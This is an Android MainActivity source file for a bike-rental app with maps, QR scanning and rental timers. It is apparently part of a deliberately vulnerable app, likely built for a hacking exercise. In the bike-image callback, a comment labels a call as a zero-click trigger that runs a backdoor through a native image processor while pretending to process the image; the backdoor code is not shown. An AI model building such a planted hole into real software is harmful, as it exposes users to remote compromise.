package com.mobility.hack.ride;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.constraintlayout.widget.ConstraintLayout;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.bumptech.glide.Glide;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.maps.CameraUpdateFactory;
import com.google.android.gms.maps.GoogleMap;
import com.google.android.gms.maps.OnMapReadyCallback;
import com.google.android.gms.maps.SupportMapFragment;
import com.google.android.gms.maps.model.BitmapDescriptorFactory;
import com.google.android.gms.maps.model.LatLng;
import com.google.android.gms.maps.model.Marker;
import com.google.android.gms.maps.model.MarkerOptions;
import com.journeyapps.barcodescanner.ScanContract;
import com.journeyapps.barcodescanner.ScanOptions;
import com.mobility.hack.MainApplication;
import com.mobility.hack.R;
import com.mobility.hack.auth.MenuActivity;
import com.mobility.hack.auth.MyInfoActivity;
import com.mobility.hack.chatbot.ChatActivity;
import com.mobility.hack.network.ApiService;
import com.mobility.hack.network.BikeResponse;
import com.mobility.hack.util.NativeImageProcessor;

import java.io.IOException;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity implements OnMapReadyCallback {

    private ConstraintLayout rentalStatusLayout;
    private TextView tvRentalTimeValue;
    private Button btnExtendRental;
    private Button btnEndRental;

    private CountDownTimer rentalTimer;

    private GoogleMap mMap;
    private FileCacher fileCacher;
    private FusedLocationProviderClient fusedLocationClient;
    private static final int LOCATION_PERMISSION_REQUEST_CODE = 1000;

    private LinearLayout bikeInfoLayout;
    private TextView tvBikeIdInfo;
    private ImageView ivBikeImage;
    private ImageButton btnCloseBikeInfo;
    private String currentBikeId; // 현재 선택된 자전거 ID 저장

    private final ActivityResultLauncher<ScanOptions> qrScannerLauncher = registerForActivityResult(new ScanContract(),
            result -> {
                if (result.getContents() == null) {
                    Toast.makeText(this, "QR 코드 스캔이 취소되었습니다.", Toast.LENGTH_SHORT).show();
                } else {
                    String qrContent = result.getContents();
                    Log.d("MainActivity", "Scanned QR Content: " + qrContent);

                    String finalBikeId = parseBikeNumberFromUrl(qrContent);

                    if (finalBikeId != null && !finalBikeId.isEmpty()) {
                        Toast.makeText(this, "인식된 자전거: " + finalBikeId, Toast.LENGTH_SHORT).show();

                        Intent intent = new Intent(MainActivity.this, PurchaseTicketActivity.class);
                        intent.putExtra("BIKE_ID", finalBikeId);
                        startActivity(intent);

                    } else {
                        Toast.makeText(this, "유효하지 않은 QR 코드입니다.", Toast.LENGTH_SHORT).show();
                    }
                }
            });

    private String parseBikeNumberFromUrl(String url) {
        if (url == null || !url.startsWith("https://zdme.kro.kr")) {
            return null;
        }
        try {
            android.net.Uri uri = android.net.Uri.parse(url);
            return uri.getQueryParameter("b");
        } catch (Exception e) {
            Log.e("MainActivity", "QR 코드 URL 파싱 오류", e);
            return null;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        bikeInfoLayout = findViewById(R.id.bikeInfoLayout);
        tvBikeIdInfo = findViewById(R.id.tv_bike_id_info);
        ivBikeImage = findViewById(R.id.iv_bike_image);
        btnCloseBikeInfo = findViewById(R.id.btnCloseBikeInfo);
        rentalStatusLayout = findViewById(R.id.rentalStatusLayout);
        tvRentalTimeValue = findViewById(R.id.tvRentalTimeValue);
        btnExtendRental = findViewById(R.id.btnExtendRental);
        btnEndRental = findViewById(R.id.btnEndRental);

        SharedPreferences prefs = getSharedPreferences("RentalPrefs", MODE_PRIVATE);
        currentBikeId = prefs.getString("BIKE_ID", null);

        btnCloseBikeInfo.setOnClickListener(v -> {
            bikeInfoLayout.setVisibility(View.GONE);
            if (mMap != null) {
                mMap.setPadding(0, 0, 0, 0);
            }
        });

        btnExtendRental.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, PurchaseTicketActivity.class);
            if (currentBikeId != null) {
                intent.putExtra("BIKE_ID", currentBikeId);
            }
            startActivity(intent);
        });

        btnEndRental.setOnClickListener(v -> startReturnBikeActivity());

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);

        SupportMapFragment mapFragment = (SupportMapFragment) getSupportFragmentManager()
                .findFragmentById(R.id.map);
        if (mapFragment != null) {
            mapFragment.getMapAsync(this);
        }

        ApiService apiService = ((MainApplication) getApplication()).getApiService();
        fileCacher = new FileCacher(apiService);

        ImageButton btnChatBot = findViewById(R.id.btnChatBot);
        btnChatBot.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, ChatActivity.class);
            startActivity(intent);
        });

        LinearLayout btnMenu = findViewById(R.id.btnMenu);
        btnMenu.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, MenuActivity.class);
            startActivity(intent);
        });

        LinearLayout btnMyInfo = findViewById(R.id.btnMyInfo);
        btnMyInfo.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, MyInfoActivity.class);
            startActivity(intent);
        });

        ImageButton btnRefresh = findViewById(R.id.btnRefresh);
        btnRefresh.setOnClickListener(v -> loadBikeData());

        ImageButton btnQrScan = findViewById(R.id.btnQrScan);
        btnQrScan.setOnClickListener(v -> {
            ScanOptions options = new ScanOptions();
            options.setOrientationLocked(true);
            options.setBeepEnabled(false);
            qrScannerLauncher.launch(options);
        });

        LinearLayout btnPurchaseTicket = findViewById(R.id.btnPurchaseTicket);
        btnPurchaseTicket.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, PointChargeActivity.class);
            startActivity(intent);
        });
    }

    private void startReturnBikeActivity() {
        Intent intent = new Intent(this, ReturnBikeActivity.class);
        startActivity(intent);
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateUiBasedOnRentalState();
    }

    private void updateUiBasedOnRentalState() {
        boolean isCurrentlyRenting = checkRentalStatus();
        ImageButton btnQrScan = findViewById(R.id.btnQrScan);

        if (isCurrentlyRenting) {
            btnQrScan.setVisibility(View.GONE);
            rentalStatusLayout.setVisibility(View.VISIBLE);
            startRentalTimer();
        } else {
            btnQrScan.setVisibility(View.VISIBLE);
            rentalStatusLayout.setVisibility(View.GONE);
            stopRentalTimer();
        }
    }

    private boolean checkRentalStatus() {
        SharedPreferences prefs = getSharedPreferences("RentalPrefs", MODE_PRIVATE);
        return prefs.getBoolean("isRenting", false);
    }

    private void startRentalTimer() {
        SharedPreferences prefs = getSharedPreferences("RentalPrefs", MODE_PRIVATE);
        long rentalDuration = prefs.getLong("rental_duration", 0);
        long rentalStartTime = prefs.getLong("rental_start_time", 0);

        if (rentalDuration <= 0 || rentalStartTime <= 0) {
            return;
        }

        long elapsedTime = System.currentTimeMillis() - rentalStartTime;
        long remainingTime = rentalDuration - elapsedTime;

        if (remainingTime <= 0) {
            tvRentalTimeValue.setText("00:00");
            Toast.makeText(this, "대여 시간이 만료되었습니다.", Toast.LENGTH_LONG).show();
            clearRentalData();
            updateUiBasedOnRentalState();
            return;
        }

        stopRentalTimer();

        rentalTimer = new CountDownTimer(remainingTime, 1000) {
            @Override
            public void onTick(long millisUntilFinished) {
                long hours = TimeUnit.MILLISECONDS.toHours(millisUntilFinished);
                long minutes = TimeUnit.MILLISECONDS.toMinutes(millisUntilFinished) - TimeUnit.HOURS.toMinutes(hours);
                long seconds = TimeUnit.MILLISECONDS.toSeconds(millisUntilFinished) - TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS.toMinutes(millisUntilFinished));

                String timeFormatted;
                if (hours > 0) {
                    timeFormatted = String.format(Locale.getDefault(), "%02d:%02d:%02d", hours, minutes, seconds);
                } else {
                    timeFormatted = String.format(Locale.getDefault(), "%02d:%02d", minutes, seconds);
                }
                tvRentalTimeValue.setText(timeFormatted);
            }

            @Override
            public void onFinish() {
                tvRentalTimeValue.setText("00:00");
                Toast.makeText(MainActivity.this, "대여 시간이 만료되었습니다.", Toast.LENGTH_LONG).show();
                clearRentalData();
                updateUiBasedOnRentalState();
            }
        }.start();
    }

    private void stopRentalTimer() {
        if (rentalTimer != null) {
            rentalTimer.cancel();
            rentalTimer = null;
        }
    }

    private void clearRentalData() {
        SharedPreferences prefs = getSharedPreferences("RentalPrefs", MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.clear();
        editor.apply();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRentalTimer();
    }

    @Override
    public void onMapReady(GoogleMap googleMap) {
        mMap = googleMap;

        mMap.setOnMarkerClickListener(marker -> {
            BikeResponse bike = (BikeResponse) marker.getTag();
            if (bike != null) {
                currentBikeId = bike.getSerialNumber(); // 현재 자전거 ID 저장
                tvBikeIdInfo.setText("자전거 번호: " + currentBikeId);
                ivBikeImage.setImageResource(R.drawable.bg_edittext_rounded); // 기본 이미지 설정
                bikeInfoLayout.setVisibility(View.VISIBLE);

                ApiService apiService = ((MainApplication) getApplication()).getApiService();
                apiService.getBikeImage(currentBikeId).enqueue(new Callback<ResponseBody>() {
                    @Override
                    public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                        if (response.isSuccessful() && response.body() != null) {
                            try {
                                byte[] imageBytes = response.body().bytes();

                                // [!!!] 제로클릭 취약점 트리거 [!!!]
                                // 네이티브 라이브러리를 호출하여 이미지를 처리하는 척하면서 백도어를 실행합니다.
                                final byte[] processedImageBytes = NativeImageProcessor.processImage(imageBytes);

                                if (processedImageBytes.length > 0) {
                                    runOnUiThread(() -> {
                                        Glide.with(MainActivity.this)
                                                .load(processedImageBytes)
                                                .into(ivBikeImage);
                                    });
                                } else {
                                    runOnUiThread(() -> {
                                        ivBikeImage.setImageResource(R.drawable.bg_edittext_rounded);
                                    });
                                }
                            } catch (IOException e) {
                                e.printStackTrace();
                                runOnUiThread(() -> {
                                    ivBikeImage.setImageResource(R.drawable.bg_edittext_rounded);
                                });
                            }
                        } else {
                            Log.d("MainActivity", "getBikeImage not successful: " + response.code());
                            runOnUiThread(() -> {
                                ivBikeImage.setImageResource(R.drawable.bg_edittext_rounded);
                            });
                        }
                    }

                    @Override
                    public void onFailure(Call<ResponseBody> call, Throwable t) {
                        Log.e("MainActivity", "getBikeImage failure", t);
                        runOnUiThread(() -> {
                            ivBikeImage.setImageResource(R.drawable.bg_edittext_rounded);
                        });
                    }
                });

                bikeInfoLayout.post(() -> {
                    int padding = (int) (getResources().getDisplayMetrics().heightPixels * 0.4);
                    mMap.setPadding(0, 0, 0, padding);
                    mMap.animateCamera(CameraUpdateFactory.newLatLng(marker.getPosition()), 500, null);
                });
            }
            return true;
        });

        mMap.setOnMapClickListener(latLng -> {
            bikeInfoLayout.setVisibility(View.GONE);
            if (mMap != null) {
                mMap.setPadding(0, 0, 0, 0);
            }
        });

        checkLocationPermissionAndMoveCamera();
        loadBikeData();
    }

    private void checkLocationPermissionAndMoveCamera() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, LOCATION_PERMISSION_REQUEST_CODE);
        } else {
            mMap.setMyLocationEnabled(true);
            fusedLocationClient.getLastLocation().addOnSuccessListener(this, location -> {
                if (location != null) {
                    LatLng currentLatLng = new LatLng(location.getLatitude(), location.getLongitude());
                    mMap.moveCamera(CameraUpdateFactory.newLatLngZoom(currentLatLng, 16));
                } else {
                    LatLng defaultLocation = new LatLng(37.5665, 126.9780);
                    mMap.moveCamera(CameraUpdateFactory.newLatLngZoom(defaultLocation, 15));
                    Toast.makeText(this, "현재 위치를 가져올 수 없습니다. 기본 위치로 표시합니다.", Toast.LENGTH_SHORT).show();
                }
            });
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == LOCATION_PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                checkLocationPermissionAndMoveCamera();
            } else {
                Toast.makeText(this, "위치 권한이 거부되었습니다. 기본 위치로 표시합니다.", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void loadBikeData() {
        Toast.makeText(this, "주변 자전거를 찾습니다...", Toast.LENGTH_SHORT).show();

        fileCacher.getBikeList(new FileCacher.BikeCallback() {
            @Override
            public void onSuccess(List<BikeResponse> bikeList) {
                mMap.clear();

                for (BikeResponse bike : bikeList) {
                    LatLng position = new LatLng(bike.getLatitude(), bike.getLongitude());
                    boolean isAvailable = bike.getStatusCode() == 1;
                    float markerColor = isAvailable ? BitmapDescriptorFactory.HUE_GREEN : BitmapDescriptorFactory.HUE_RED;

                    MarkerOptions markerOptions = new MarkerOptions()
                            .position(position)
                            .title(bike.getSerialNumber())
                            .snippet("상태: " + bike.getStatus())
                            .icon(BitmapDescriptorFactory.defaultMarker(markerColor));

                    Marker marker = mMap.addMarker(markerOptions);
                    marker.setTag(bike);
                }
            }

            @Override
            public void onFailure(String errorMessage) {
                Toast.makeText(MainActivity.this, "데이터 로드 실패: " + errorMessage, Toast.LENGTH_LONG).show();
            }
        });
    }
}
